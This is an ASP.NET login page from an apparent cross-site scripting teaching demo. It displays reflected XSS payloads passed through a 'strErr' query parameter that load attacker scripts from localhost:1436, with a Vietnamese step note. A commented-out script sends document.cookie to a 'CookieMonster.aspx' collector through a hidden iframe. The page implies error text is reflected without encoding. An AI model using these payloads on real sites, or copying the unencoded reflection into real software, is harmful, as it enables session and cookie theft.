<%@ Page Title="" Language="C#" MasterPageFile="~/Site.Master" AutoEventWireup="true" 
CodeBehind="LoginPage.aspx.cs"  Inherits="WebApp.XSS_Demo.LoginPage" %>

<asp:Content ID="Content1" ContentPlaceHolderID="HeadContent" runat="server">
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="MainContent" runat="server">
    <div>
        <table>
            <tr>
                <td colspan="2">
                    <h4><asp:Label ID="lbl_Default_Login_Page" runat="server" Text="Login Information"></asp:Label></h4>
                </td>
            </tr>
            <tr>
                <td>
                    <asp:Label runat="server" Text="User Name: " AssociatedControlID="txtUserName"></asp:Label>
                </td>
                <td>
                    <asp:TextBox runat="server" ID="txtUserName"></asp:TextBox>
                    <asp:RequiredFieldValidator ID="RequiredFieldValidator1" runat="server" 
                        ErrorMessage="(*)" ControlToValidate="txtUserName" ForeColor="Red"></asp:RequiredFieldValidator>
                </td>
            </tr>
            <tr>
                <td>
                    <asp:Label runat="server" Text="Password: " AssociatedControlID="txtPass"></asp:Label>
                </td>
                <td>
                    <asp:TextBox runat="server" ID="txtPass" TextMode="Password"></asp:TextBox>
                    <asp:RequiredFieldValidator ID="RequiredFieldValidator2" runat="server" 
                        ErrorMessage="(*)" ControlToValidate="txtPass" ForeColor="Red"></asp:RequiredFieldValidator>
                </td>
            </tr>
            <tr>
                <td align="center" colspan="2">
                    <asp:Label runat="server" ID="lblStatusInfo" CssClass="failureNotification"></asp:Label>
                </td>
            </tr>
            <tr align="center">
                <td>&nbsp;</td>
                <td>
                    <asp:Button ID="btnLogin" runat="server" Text="LogIn" 
                        onclick="btnLogin_Click" />
                    <asp:Button ID="btnClear" runat="server" Text="Clear" />
                </td>
            </tr>
            <tr>
                <td colspan="2" align="center">&nbsp;</td>
            </tr>
        </table>
        <br /><br />
        <asp:Label ID="lblCookies" runat="server"></asp:Label>
    </div>
    <div>
        Cross-Site Scripting (CSS/XSS) attack
        <br />
    </div>
    <div>
        LoginPage.aspx?strErr="> &lt;script src="http://localhost:1436/maliciousscript.js"&gt;&lt;/script&gt;
        <br />
        Thuc hien chen lenh: LoginPage.aspx?strErr="> &lt;script src="http://localhost:1436/AttackCooke.js"&gt;&lt;/script&gt;
        vao lblStatusInfo.Text => enter =>Xss
    </div>
    <div>
        <%--<script>
            var s = '<iframe style="display:none" src="http://localhost:1436/CookieMonster.aspx?c=' + escape(document.cookie) + '"></iframe>';
            document.write(s);
        </script>--%>
        <%--<script src="http://localhost:1436/AttackCooke.js">
        </script>--%>
    </div>
</asp:Content>
